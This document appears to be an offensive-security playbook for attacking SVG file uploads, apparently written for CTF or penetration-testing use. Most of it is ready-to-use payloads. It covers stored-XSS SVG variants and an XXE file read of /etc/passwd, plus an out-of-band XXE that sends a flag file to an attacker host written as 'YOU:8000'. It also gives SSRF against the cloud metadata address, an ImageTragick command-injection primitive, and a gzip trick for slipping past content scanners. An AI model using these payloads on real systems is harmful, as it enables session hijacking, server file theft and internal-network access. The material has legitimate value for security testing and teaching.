# SVG Attacks — the image that is also a document

## Why SVG is the highest-value image upload

SVG is XML rendered by the browser — an uploaded `.svg` served inline is a
stored-XSS document AND an XML-parser document AND (server-side) input to
image converters. Three attack surfaces in one file.

## Stored XSS via SVG — the primary goal

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```

Works only when the file is **rendered in a browsing context** — `<img>`
does NOT execute script. The paths that do:

- direct navigation to `/uploads/x.svg` served `Content-Type: image/svg+xml`
- `<iframe src=/uploads/x.svg>` / `<embed>` / `<object>`
- inline `<svg>` injected by the app (some apps inline the raw SVG markup)
- served `text/html` (misconfig) — then any HTML in it runs

Blocked by: `Content-Disposition: attachment`, `X-Content-Type-Options:
nosniff` + wrong type, `Content-Security-Policy` on the serving response
(but see below), being served from a cookieless/static domain (still XSS,
just no cookies → phish/deface/CSRF-token read on same-site still counts).

### Script-bearing SVG forms

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)"><rect width="100%" height="100%"/></a></svg>
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>
<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/></svg>
<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"/></foreignObject></svg>
```

`foreignObject` embeds full XHTML — every HTML event handler applies.

### CSP nuance on the serving origin

- SVG served with `Content-Security-Policy: script-src 'self'` — inline
  script dies; `onload` dies. Host the script part in the *challenge app's*
  own JS? DOM clobber / JSONP — out of scope here, it's the XSS skill.
- SVG served `image/svg+xml` from the app origin — the script runs with
  the app's cookies — the real prize vs a static-CDN origin.

## XXE via SVG — server-side parsers

If the SVG is parsed server-side (thumbnail, validation, import):

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&x;</text>
</svg>
```

The entity must reach rendered output — a thumbnail pixels-out can't echo
text; an app that echoes "parsed title/desc" or re-serves the SVG can.
Parameter-entity/OOB form for blind cases:

```xml
<!DOCTYPE svg [
  <!ENTITY % x SYSTEM "file:///flag">
  <!ENTITY % e "<!ENTITY exfil SYSTEM 'http://YOU:8000/?d=%x;'>">
  %e; %exfil;
]>
<svg/>
```

`tools/web/oob_listener.py serve --port 8000 --log hits.jsonl` catches the
hit. Deeper XXE grammar → `web-xxe` skill.

## SSRF via SVG — external resource refs

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"/>
  <use xlink:href="http://internal/admin#x"/>
</svg>
```

Server-side renderers (rsvg-convert, Inkscape, some ImageMagick SVG
delegates, headless browsers rendering SVG previews) fetch the href —
SSRF with a callback proof. `<image>`, `<use>`, `<script xlink:href>`,
`<feImage>`, `@import` CSS, `url(...)` references all fetch.

## SVG → ImageMagick / MVG delegate angle

An SVG processed by ImageMagick may route to the MVG coder — the
ImageTragick primitives (`image over ... 'https://x|id'`) apply →
`image-attacks.md`.

## The serve-context check — do it before crafting

```
fetch /uploads/x.svg →
  Content-Type: image/svg+xml  + 200 + no attachment   → inline XSS path
  Content-Type: text/plain/octet-stream                → dead for XSS; XML parse maybe alive
  Content-Disposition: attachment                      → dead for XSS
  served by a DIFFERENT domain/CDN                     → XSS but no cookies — sessionless
  404 but upload 200                                    → find the serve path — retrieval.md
```

## `.svg` vs `.svgz` (gzip'd)

Some parsers take gzipped SVG — bypass for byte-level scanners that grep
`<script` in the stored bytes: gzipped body hides the literal. Emitted as
`gzip -9 < x.svg > x.svgz`.

## Inline-SVG — when the app embeds the markup

Some apps embed the uploaded SVG's raw XML inline in a page (`<div
class="icon">{{svg}}</div>`) — the script executes in the app's own
context with no navigation needed. Also: `<use href="data:image/svg+xml">`
and `<svg><use href="/uploads/x.svg#id">` compositions.

## Polyglot SVG — XML that's also something else

- SVG+HTML — `<svg><foreignObject>` carries full HTML — already one file
- SVG+XSLT — `<?xml-stylesheet type="text/xsl" href="..."?>` — stylesheet
  fetch/execution in browsers that honor it (rare)
- SVG+ZIP — tail-anchor trick; unzipper + svg renderer both valid

## Falsifiers

- SVG is served only with `attachment`/`octet-stream` and never parsed
  server-side or inlined
- the app's image pipeline rasterizes SVG to PNG before serving (script
  dead; check anyway for MVG/XXE inside the rasterizer)
- CSP `script-src` blocks every inline form AND no same-origin gadget exists

## Output to record

- the serve response headers verbatim (type, disposition, CSP, origin)
- whether the vector is XSS/XXE/SSRF/coder — each has a different proof
- the verbatim callback/log line for blind channels
